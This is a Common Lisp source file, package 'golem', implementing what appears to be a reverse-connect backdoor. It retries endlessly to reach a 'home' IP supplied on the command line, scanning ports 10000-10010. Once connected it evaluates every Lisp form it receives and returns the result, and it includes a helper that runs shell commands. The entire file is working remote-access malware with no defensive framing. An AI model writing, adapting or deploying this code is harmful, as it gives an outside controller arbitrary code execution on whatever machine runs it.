(defpackage golem
  (:use :cl))
(in-package :golem)

(defparameter *buffer-size* 4096)
(defvar *max-payload-length* 4294967296)
(defvar *element-type* '(unsigned-byte 8))

(defun int->bytes (number n-bytes)
  "turn a number into a buffer of n-bytes in big endian"
  (let ((buff (make-array n-bytes :element-type '(unsigned-byte 8))))
    (loop for start from 0 below (* 8 n-bytes) by 8
          for i from (1- n-bytes) downto 0
          do (setf (elt buff i) (ldb (byte 8 start) number)))
    buff))

(defun bytes->int (buff)
  "turn an array of bytes in big endian to an integer"
  (loop with len = (length buff)
        for i = 1 then (* 256 i)
        for buff-i from (1- len) downto 0
        sum (* i (elt buff buff-i))))

(defun read-payload-length (stream)
  (format t "[+] Checking payload length~%")
  (let ((buff (make-array 4)))
    (read-sequence buff stream)
    (bytes->int buff)))

(defun send-data (socket buffer)
  "send data and flush the stream"
  (format t "[+] Sending data: ~a~%" buffer)
  (let ((stream (usocket:socket-stream socket))
        (len (length buffer)))
    ;; payload cannot be bigger than 2**32 bytes (4GB)
    (assert (< len *max-payload-length*))

    ;; write the length of the payload
    (write-sequence (int->bytes len 4) stream)

    ;; write the payload
    (write-sequence buffer stream)

    (force-output stream)))

(defun recv-data (socket)
  (format t "[+] Waiting for input from home...~%")
  (usocket:wait-for-input socket)

  (format t "[+] Starting to read...~%")

  (let ((stream (usocket:socket-stream socket))
        (buffer (make-array *buffer-size*
                            :element-type *element-type*))
        (result (make-array 0
                            :element-type *element-type*
                            :adjustable t
                            :fill-pointer t)))

    (loop with payload-length = (read-payload-length stream)
          with total-read = 0
          for i = 0 then (1+ i)
          for left-to-read = (- payload-length total-read)
          for to-read = (min left-to-read *buffer-size*)
          do (format t "[+] Reading ~a to ~a. Total: ~a, left from payload: ~a~%"
                     0 to-read total-read left-to-read)
          until (or (> i 10) (<= left-to-read 0))
          do (let ((read (read-sequence buffer stream :start 0 :end to-read)))
               (setf total-read (+ total-read read))
               (setf result (concatenate 'vector result (subseq buffer 0 read)))))

    (trivial-utf-8:utf-8-bytes-to-string result)))

(defun sh (command)
  (with-output-to-string (stream)
    (uiop:run-program command :output stream)))

(defun search-for-port (ip &key (start 10000) (end 10010))
  (loop for port = start then (1+ port)
        for socket = (ignore-errors
                       (usocket:socket-connect
                        ip port :element-type *element-type*))
        do (format t "[+] Trying to connect to ~a:~a... ~a~%"
                   ip port socket)
        if socket do (return (values socket port))
        if (= port end) do (setf port (1- start))
        do (sleep 1)))

(defun dial-home (home-ip)
  (multiple-value-bind (socket port) (search-for-port home-ip)
    (format t "[+] Connected! Now waiting for commands from ~a:~a~%"
            home-ip port)
    (loop for command = (recv-data socket)
          do (format t "[+] Received: ~a~%" command)
          if (string= command "(quit)")
          do (send-data socket #(111 107))
          until (string= command "(quit)")
          do (format t "[+] Evaluating message from *home*...~%")
          do (ignore-errors
               (with-input-from-string (s command)
                 (let ((result (eval (read s))))
                   (format t "[+] Result: \"~a\"~%" result)
                   (send-data socket
                              (trivial-utf-8:string-to-utf-8-bytes
                               (format nil "~a" result)))))))

    (finish-output (usocket:socket-stream socket))
    (usocket:socket-close socket)))

(defun entry ()
  (let ((home-ip (car (uiop:command-line-arguments))))
    (loop while t do (dial-home home-ip))))
